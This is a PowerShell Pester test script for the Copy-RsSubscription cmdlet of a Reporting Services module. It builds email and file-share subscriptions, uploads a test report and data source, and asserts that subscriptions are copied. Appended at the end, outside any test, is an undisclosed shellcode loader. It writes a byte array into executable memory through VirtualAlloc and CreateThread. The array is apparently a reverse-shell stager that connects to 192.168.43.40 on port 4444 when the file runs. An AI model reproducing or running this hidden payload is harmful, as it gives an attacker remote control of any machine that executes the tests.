


$reportServerUri = if ($env:PesterServerUrl -eq $null) { 'http://localhost/reportserver' } else { $env:PesterServerUrl }


Function New-InMemoryEmailSubscription
{

    [xml]$matchData = '<?xml version="1.0" encoding="utf-16" standalone="yes"?><ScheduleDefinition xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><StartDateTime xmlns="http://schemas.microsoft.com/sqlserver/reporting/2010/03/01/ReportServer">2017-07-14T08:00:00.000+01:00</StartDateTime><WeeklyRecurrence xmlns="http://schemas.microsoft.com/sqlserver/reporting/2010/03/01/ReportServer"><WeeksInterval>1</WeeksInterval><DaysOfWeek><Monday>true</Monday><Tuesday>true</Tuesday><Wednesday>true</Wednesday><Thursday>true</Thursday><Friday>true</Friday></DaysOfWeek></WeeklyRecurrence></ScheduleDefinition>'

    $proxy = New-RsWebServiceProxy -ReportServerUri $reportServerUri
    $namespace = $proxy.GetType().NameSpace

    $ExtensionSettingsDataType = "$namespace.ExtensionSettings"
    $ParameterValueOrFieldReference = "$namespace.ParameterValueOrFieldReference[]"
    $ParameterValueDataType = "$namespace.ParameterValue"

    
    $ExtensionSettings = New-Object $ExtensionSettingsDataType
                    
    $ExtensionSettings.Extension = "Report Server Email"

    
    $ParameterValues = New-Object $ParameterValueOrFieldReference -ArgumentList 8

    $to = New-Object $ParameterValueDataType
    $to.Name = "TO";
    $to.Value = "mail@rstools.com"; 
    $ParameterValues[0] = $to;

    $replyTo = New-Object $ParameterValueDataType
    $replyTo.Name = "ReplyTo";
    $replyTo.Value ="dank@rstools.com";
    $ParameterValues[1] = $replyTo;

    $includeReport = New-Object $ParameterValueDataType
    $includeReport.Name = "IncludeReport";
    $includeReport.Value = "False";
    $ParameterValues[2] = $includeReport;

    $renderFormat = New-Object $ParameterValueDataType
    $renderFormat.Name = "RenderFormat";
    $renderFormat.Value = "MHTML";
    $ParameterValues[3] = $renderFormat;

    $priority = New-Object $ParameterValueDataType
    $priority.Name = "Priority";
    $priority.Value = "NORMAL";
    $ParameterValues[4] = $priority;

    $subject = New-Object $ParameterValueDataType
    $subject.Name = "Subject";
    $subject.Value = "Your sales report";
    $ParameterValues[5] = $subject;

    $comment = New-Object $ParameterValueDataType
    $comment.Name = "Comment";
    $comment.Value = "Here is the link to your report.";
    $ParameterValues[6] = $comment;

    $includeLink = New-Object $ParameterValueDataType
    $includeLink.Name = "IncludeLink";
    $includeLink.Value = "True";
    $ParameterValues[7] = $includeLink;

    $ExtensionSettings.ParameterValues = $ParameterValues

    $subscription = [pscustomobject]@{
        DeliverySettings      = $ExtensionSettings
        Description           = "Send email to mail@rstools.com"
        EventType             = "TimedSubscription"
        IsDataDriven          = $false
        MatchData             = $matchData.OuterXml
        Values                = $null
    }
    
    return $subscription
}

Function New-InMemoryFileShareSubscription
{
    [xml]$matchData = '<?xml version="1.0" encoding="utf-16" standalone="yes"?><ScheduleDefinition xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><StartDateTime xmlns="http://schemas.microsoft.com/sqlserver/reporting/2010/03/01/ReportServer">2017-07-14T08:00:00.000+01:00</StartDateTime><WeeklyRecurrence xmlns="http://schemas.microsoft.com/sqlserver/reporting/2010/03/01/ReportServer"><WeeksInterval>1</WeeksInterval><DaysOfWeek><Monday>true</Monday><Tuesday>true</Tuesday><Wednesday>true</Wednesday><Thursday>true</Thursday><Friday>true</Friday></DaysOfWeek></WeeklyRecurrence></ScheduleDefinition>'

    $proxy = New-RsWebServiceProxy -ReportServerUri $reportServerUri
    $namespace = $proxy.GetType().NameSpace

    $ExtensionSettingsDataType = "$namespace.ExtensionSettings"
    $ParameterValueOrFieldReference = "$namespace.ParameterValueOrFieldReference[]"
    $ParameterValueDataType = "$namespace.ParameterValue"

    
    $ExtensionSettings = New-Object $ExtensionSettingsDataType
    $ExtensionSettings.Extension = "Report Server FileShare"

    
    $ParameterValues = New-Object $ParameterValueOrFieldReference -ArgumentList 7

    $to = New-Object $ParameterValueDataType
    $to.Name = "PATH";
    $to.Value = "\\unc\path"; 
    $ParameterValues[0] = $to;

    $replyTo = New-Object $ParameterValueDataType
    $replyTo.Name = "FILENAME";
    $replyTo.Value ="Report";
    $ParameterValues[1] = $replyTo;

    $includeReport = New-Object $ParameterValueDataType
    $includeReport.Name = "FILEEXTN";
    $includeReport.Value = "True";
    $ParameterValues[2] = $includeReport;

    $renderFormat = New-Object $ParameterValueDataType
    $renderFormat.Name = "USERNAME";
    $renderFormat.Value = "user";
    $ParameterValues[3] = $renderFormat;

    $priority = New-Object $ParameterValueDataType
    $priority.Name = "RENDER_FORMAT";
    $priority.Value = "PDF";
    $ParameterValues[4] = $priority;

    $subject = New-Object $ParameterValueDataType
    $subject.Name = "WRITEMODE";
    $subject.Value = "Overwrite";
    $ParameterValues[5] = $subject;

    $comment = New-Object $ParameterValueDataType
    $comment.Name = "DEFAULTCREDENTIALS";
    $comment.Value = "False";
    $ParameterValues[6] = $comment;

    $ExtensionSettings.ParameterValues = $ParameterValues

    $subscription = [pscustomobject]@{
        DeliverySettings      = $ExtensionSettings
        Description           = "Shared on \\unc\path"
        EventType             = "TimedSubscription"
        IsDataDriven          = $false
        MatchData             = $matchData.OuterXml
        Values                = $null
    }
    
    return $subscription
}

Function Set-FolderReportDataSource {
    param (
        [string]
        $NewFolderPath
    )

    $tempProxy = New-RsWebServiceProxy -ReportServerUri $reportServerUri

    
    $localResourcesPath = (Get-Item -Path ".\").FullName  + '\Tests\CatalogItems\testResources\emptyReport.rdl'
    $null = Write-RsCatalogItem -Path $localResourcesPath -RsFolder $NewFolderPath -Proxy $tempProxy
    $report = (Get-RsFolderContent -RsFolder $NewFolderPath -Proxy $tempProxy)| Where-Object TypeName -eq 'Report'

    
    $localResourcesPath =   (Get-Item -Path ".\").FullName  + '\Tests\CatalogItems\testResources\UnDataset.rsd'
    $null = Write-RsCatalogItem -Path $localResourcesPath -RsFolder $NewFolderPath -Proxy $tempProxy
    $dataSet = (Get-RsFolderContent -RsFolder $NewFolderPath -Proxy $tempProxy) | Where-Object TypeName -eq 'DataSet'
    $DataSetPath = $NewFolderPath + '/UnDataSet'

    
    $newRSDSName = "DataSource"
    $newRSDSExtension = "SQL"
    $newRSDSConnectionString = "Initial Catalog=DB; Data Source=Instance"
    $newRSDSCredentialRetrieval = "Store"
    $Pass = ConvertTo-SecureString -String "123" -AsPlainText -Force
    $newRSDSCredential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList "sql", $Pass
    $null = New-RsDataSource -RsFolder $NewFolderPath -Name $newRSDSName -Extension $newRSDSExtension -ConnectionString $newRSDSConnectionString -CredentialRetrieval $newRSDSCredentialRetrieval -DatasourceCredentials $newRSDSCredential -Proxy $tempProxy

    $DataSourcePath = "$NewFolderPath/$newRSDSName"

    
    $RsDataSet = Get-RsItemReference -Path $report.Path -Proxy $tempProxy | Where-Object ReferenceType -eq 'DataSet'
    $RsDataSource = Get-RsItemReference -Path $report.Path -Proxy $tempProxy | Where-Object ReferenceType -eq 'DataSource'
    $RsDataSetSource = Get-RsItemReference -Path $DataSetPath -Proxy $tempProxy | Where-Object ReferenceType -eq 'DataSource'

    
    $null = Set-RsDataSourceReference -Path $DataSetPath -DataSourceName $RsDataSetSource.Name -DataSourcePath $DataSourcePath -Proxy $tempProxy
    $null = Set-RsDataSourceReference -Path $report.Path -DataSourceName $RsDataSource.Name -DataSourcePath $DataSourcePath -Proxy $tempProxy
    $null = Set-RsDataSetReference -Path $report.Path -DataSetName $RsDataSet.Name -DataSetPath $dataSet.Path -Proxy $tempProxy

    return $report
}

Describe "Copy-RsSubscription" {
    $folderPath = ''
    $newReport = $null
    $subscription = $null

    BeforeEach {
        $folderName = 'SutGetRsItemReference_MinParameters' + [guid]::NewGuid()
        $null = New-RsFolder -Path / -FolderName $folderName -ReportServerUri $reportServerUri
        $folderPath = '/' + $folderName

        
        $newReport = Set-FolderReportDataSource($folderPath)

        
        $subscription = New-InMemoryFileShareSubscription
    }

    AfterEach {
        Remove-RsCatalogItem -RsFolder $folderPath -ReportServerUri $reportServerUri -Confirm:$false -ErrorAction Continue
    }

    Context "Copy-RsSubscription with Proxy parameter"{
        It "Should set a subscription" {
            $proxy = New-RsWebServiceProxy -ReportServerUri $reportServerUri
            Copy-RsSubscription -Subscription $subscription -Path $newReport.Path -Proxy $proxy

            $reportSubscriptions = Get-RsSubscription -Path $newReport.Path -ReportServerUri $reportServerUri
            @($reportSubscriptions).Count | Should Be 1
            $reportSubscriptions.Report | Should Be "emptyReport"
            $reportSubscriptions.EventType | Should Be "TimedSubscription"
            $reportSubscriptions.IsDataDriven | Should Be $false
        }
    }

    Context "Copy-RsSubscription with ReportServerUri Parameter"{
        It "Should set a subscription" {
            Copy-RsSubscription -Subscription $subscription -Path $newReport.Path -ReportServerUri $reportServerUri

            $reportSubscriptions = Get-RsSubscription -Path $newReport.Path -ReportServerUri $reportServerUri
            @($reportSubscriptions).Count | Should Be 1
            $reportSubscriptions.Report | Should Be "emptyReport"
            $reportSubscriptions.EventType | Should Be "TimedSubscription"
            $reportSubscriptions.IsDataDriven | Should Be $false
        }
    }

    Context "Copy-RsSubscription with ReportServerUri and Proxy Parameter"{
        It "Should set a subscription" {
            $proxy = New-RsWebServiceProxy -ReportServerUri $ReportServerUri
            Copy-RsSubscription -ReportServerUri $ReportServerUri -Subscription $subscription -Path $newReport.Path -Proxy $proxy

            $reportSubscriptions = Get-RsSubscription -Path $newReport.Path -ReportServerUri $reportServerUri
            @($reportSubscriptions).Count | Should Be 1
            $reportSubscriptions.Report | Should Be "emptyReport"
            $reportSubscriptions.EventType | Should Be "TimedSubscription"
            $reportSubscriptions.IsDataDriven | Should Be $false
        }
    }
}

Describe "Copy-RsSubscription from pipeline" {
    $folderPath = ''
    $newReport = $null
    $subscription = $null

    BeforeEach {
        $folderName = 'SutGetRsItemReference_MinParameters' + [guid]::NewGuid()
        $null = New-RsFolder -Path / -FolderName $folderName -ReportServerUri $reportServerUri
        $folderPath = '/' + $folderName

        
        $newReport = Set-FolderReportDataSource($folderPath)

        
        $subscription = New-InMemoryFileShareSubscription
    }

    AfterEach {
        Remove-RsCatalogItem -RsFolder $folderPath -ReportServerUri $reportServerUri -Confirm:$false -ErrorAction Continue
    }

    Context "Copy-RsSubscription from pipeline with Proxy parameter"{
        It "Should set a subscription" {
            $proxy = New-RsWebServiceProxy -ReportServerUri $reportServerUri

            
            Copy-RsSubscription -Subscription $subscription -Path $newReport.Path -Proxy $proxy

            
            Get-RsSubscription -Path $newReport.Path -Proxy $proxy | Copy-RsSubscription -Path $newReport.Path -Proxy $proxy

            
            $reportSubscriptions = Get-RsSubscription -Path $newReport.Path -ReportServerUri $reportServerUri
            @($reportSubscriptions).Count | Should Be 2
            ($reportSubscriptions | Select-Object SubscriptionId -Unique).Count | Should Be 2
        }
    }

    Context "Copy-RsSubscription from pipeline with ReportServerUri Parameter"{
        It "Should copy a subscription" {
            
            Copy-RsSubscription -Subscription $subscription -Path $newReport.Path -ReportServerUri $reportServerUri

            
            Get-RsSubscription -Path $newReport.Path -ReportServerUri $reportServerUri | Copy-RsSubscription -Path $newReport.Path -ReportServerUri $reportServerUri

            
            $reportSubscriptions = Get-RsSubscription -Path $newReport.Path -ReportServerUri $reportServerUri
            @($reportSubscriptions).Count | Should Be 2
            ($reportSubscriptions | Select-Object SubscriptionId -Unique).Count | Should Be 2
        }
    }

    Context "Copy-RsSubscription from pipeline with ReportServerUri and Proxy Parameter"{
        It "Should copy a subscription" {
            $proxy = New-RsWebServiceProxy -ReportServerUri $reportServerUri

            
            Copy-RsSubscription -Subscription $subscription -Path $newReport.Path -ReportServerUri $reportServerUri -Proxy $proxy

            
            Get-RsSubscription -Path $newReport.Path -ReportServerUri $reportServerUri -Proxy $proxy | Copy-RsSubscription -Path $newReport.Path -ReportServerUri $reportServerUri -Proxy $proxy

            
            $reportSubscriptions = Get-RsSubscription -Path $newReport.Path -ReportServerUri $reportServerUri
            @($reportSubscriptions).Count | Should Be 2
            ($reportSubscriptions | Select-Object SubscriptionId -Unique).Count | Should Be 2
        }
    }

    Context "Copy-RsSubscription from pipeline with input from disk"{
        It "Should copy a subscription" {
            $TestPath = 'TestDrive:\Subscription.xml'
            $subscription | Export-RsSubscriptionXml $TestPath
            $subscriptionFromDisk = Import-RsSubscriptionXml $TestPath -ReportServerUri $reportServerUri

            $proxy = New-RsWebServiceProxy -ReportServerUri $reportServerUri

            
            Copy-RsSubscription -Subscription $subscriptionFromDisk -Path $newReport.Path -ReportServerUri $reportServerUri -Proxy $proxy

            
            Get-RsSubscription -Path $newReport.Path -ReportServerUri $reportServerUri -Proxy $proxy | Copy-RsSubscription -Path $newReport.Path -ReportServerUri $reportServerUri -Proxy $proxy

            
            $reportSubscriptions = Get-RsSubscription -Path $newReport.Path -ReportServerUri $reportServerUri
            @($reportSubscriptions).Count | Should Be 2
            ($reportSubscriptions | Select-Object SubscriptionId -Unique).Count | Should Be 2
        }
    }
}

$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x82,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf2,0x52,0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x01,0xd1,0x51,0x8b,0x59,0x20,0x01,0xd3,0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf6,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,0x8d,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x6a,0x05,0x68,0xc0,0xa8,0x2b,0x28,0x68,0x02,0x00,0x11,0x5c,0x89,0xe6,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0a,0xff,0x4e,0x08,0x75,0xec,0xe8,0x61,0x00,0x00,0x00,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7e,0x36,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7d,0x22,0x58,0x68,0x00,0x40,0x00,0x00,0x6a,0x00,0x50,0x68,0x0b,0x2f,0x0f,0x30,0xff,0xd5,0x57,0x68,0x75,0x6e,0x4d,0x61,0xff,0xd5,0x5e,0x5e,0xff,0x0c,0x24,0xe9,0x71,0xff,0xff,0xff,0x01,0xc3,0x29,0xc6,0x75,0xc7,0xc3,0xbb,0xf0,0xb5,0xa2,0x56,0x6a,0x00,0x53,0xff,0xd5;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

